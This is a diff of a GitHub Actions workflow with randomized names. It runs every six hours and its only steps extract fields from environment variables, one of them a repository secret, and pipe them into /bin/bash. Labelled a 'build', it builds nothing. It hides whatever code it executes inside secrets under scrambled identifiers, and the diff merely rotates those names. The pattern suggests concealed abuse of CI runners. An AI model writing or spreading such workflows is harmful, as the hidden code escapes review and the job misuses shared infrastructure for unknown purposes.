@@ -3,27 +3,23 @@ name: tengtexie6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 0/6 * * *'
-
+    - cron: '2 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tengtexie6789
         env:
-          n606: ${{ secrets.n606 }}
+          hnwlb2195: ${{ secrets.hnwlb2195 }}
         run: |
-          echo $n606 | jq -r .zhat0399 | /bin/bash
-          echo $gxi3532 | jq -r .h53 | /bin/bash
-          echo $jdjy28068 | jq -r .axkya03464 | /bin/bash
-          echo $ocmfy6 | jq -r .c2 | /bin/bash
-          echo $nq760 | jq -r .z93342 | /bin/bash
-          echo $sdien066 | jq -r .d424 | /bin/bash
-          echo $kikc0 | jq -r .dnbk061 | /bin/bash
-          echo $vct17433 | jq -r .iie29 | /bin/bash
-          echo $cnvf7 | jq -r .am3 | /bin/bash
-          echo $hz980 | jq -r .pyuk83 | /bin/bash
-          echo $mscv4406 | jq -r .xdec6 | /bin/bash
+          echo $hnwlb2195 | jq -r .eldt80 | /bin/bash
+          echo $d71865 | jq -r .aiefb00386 | /bin/bash
+          echo $z89255 | jq -r .fbi0 | /bin/bash
+          echo $q54257 | jq -r .p6 | /bin/bash
+          echo $n0 | jq -r .evsw6125 | /bin/bash
+          echo $yjjqt41760 | jq -r .p7649 | /bin/bash
+          echo $h2 | jq -r .rnu1280 | /bin/bash
+          echo $ut06 | jq -r .g827 | /bin/bash
+          echo $dglmh3325 | jq -r .sjvop17 | /bin/bash
 
